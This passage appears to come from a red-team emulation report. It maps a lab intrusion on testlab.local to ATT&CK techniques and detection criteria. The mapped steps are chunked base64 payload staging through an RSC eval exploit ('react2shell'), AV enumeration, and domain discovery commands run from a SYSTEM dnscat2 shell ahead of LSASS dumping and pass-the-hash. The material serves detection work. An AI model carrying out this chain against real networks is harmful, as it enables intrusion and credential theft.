    IPC$        IPC            Remote IPC
    NETLOGON    Disk           Logon server share
    SYSVOL      Disk           Logon server share
    The command completed successfully.
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | Sequential POST requests to `react.testlab.local` RSC endpoint appending 2,000-char base64 blocks to `C:\Windows\Temp\WmiAvQuery.b64` via eval-based `fs.appendFileSync`; no child process spawned | Not Calibrated - Not Benign | react2shell `upload` command stages `WmiAvQuery.exe` (as `WmiAvQuery.b64`) to IIS server; identical eval-based chunked mechanism to Phase 1 Step 3 and Phase 2 Step 4 — already scored | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | POST to RSC endpoint decodes `WmiAvQuery.b64` to `WmiAvQuery.bin` via `Buffer.from(..., 'base64')`; `WmiAvQuery.bin` subsequently renamed to `WmiAvQuery.exe` | Not Calibrated - Not Benign | react2shell `decode` and `rename` commands convert staged base64 to executable in-place with no child process or decoder binary - identical mechanism to Phase 1 Step 3, already scored | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decode()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Discovery | T1518.001 | Software Discovery: Security Software Discovery | Windows | `WmiAvQuery.exe` queries `ROOT\SecurityCenter2` WMI namespace executing WQL `SELECT * FROM AntiVirusProduct` via `IWbemServices::ExecQuery`; on Windows Server, transparently falls back to `ROOT\Microsoft\Windows\Defender` namespace querying `MSFT_MpComputerStatus` | Calibrated - Not Benign | `WmiAvQuery.exe` enumerates installed AV products — on Windows client via `ROOT\SecurityCenter2` (`IWbemLocator` → `IWbemServices`), on Windows Server via fallback to `ROOT\Microsoft\Windows\Defender` (`MSFT_MpComputerStatus`) | react.testlab.local | NT AUTHORITY\SYSTEM | [main.cpp](../../resources/payloads/WmiAvQuery/main.cpp) | -
| Discovery | T1033 | System Owner/User Discovery | Windows | `RuntimeBroker.exe` (ghost process) spawns `cmd.exe` which executes `whoami.exe /all` on react.testlab.local | Not Calibrated - Not Benign | `whoami /all` dumps the full SYSTEM token - user SID, group memberships, privilege list, integrity level - confirming successful escalation and presence of `SeDebugPrivilege` | react.testlab.local | NT AUTHORITY\SYSTEM | - | -
| Discovery | T1018 | Remote System Discovery | Windows | `RuntimeBroker.exe` (ghost process) spawns `cmd.exe` which executes `nltest.exe /dsgetdc:TESTLAB` to query Domain Controller information on react.testlab.local | Not Calibrated - Not Benign | `nltest /dsgetdc:TESTLAB` queries the Netlogon service to return DC hostname (`DC01`), IP (`10.12.10.10`), site, and role flags (PDC, GC, KDC) from the SYSTEM dnscat2 shell | react.testlab.local | NT AUTHORITY\SYSTEM | - | -
| Discovery | T1069.002 | Permission Groups Discovery: Domain Groups | Windows | `RuntimeBroker.exe` (ghost process) spawns `cmd.exe` which executes `net.exe group "Domain Admins" /domain` on react.testlab.local | Not Calibrated - Not Benign | `net group "Domain Admins" /domain` enumerates DA members to identify high-value credential targets from the LSASS dump | react.testlab.local | NT AUTHORITY\SYSTEM | - | -
| Discovery | T1087.002 | Account Discovery: Domain Account | Windows | `RuntimeBroker.exe` (ghost process) spawns `cmd.exe` which executes `net.exe user /domain` on react.testlab.local | Not Calibrated - Not Benign | `net user /domain` enumerates all domain accounts - cross-referenced against LSASS dump output to identify which hashes are recoverable | react.testlab.local | NT AUTHORITY\SYSTEM | - | -
| Discovery | T1135 | Network Share Discovery | Windows | `RuntimeBroker.exe` (ghost process) spawns `cmd.exe` which executes `net.exe view \\DC01` to enumerate remote shares on react.testlab.local | Not Calibrated - Not Benign | `net view \\DC01` enumerates admin shares (`ADMIN$`, `C$`, `NETLOGON`, `SYSVOL`) on the DC to confirm SMB lateral movement path is accessible before Pass-the-Hash | react.testlab.local | NT AUTHORITY\SYSTEM | - | -
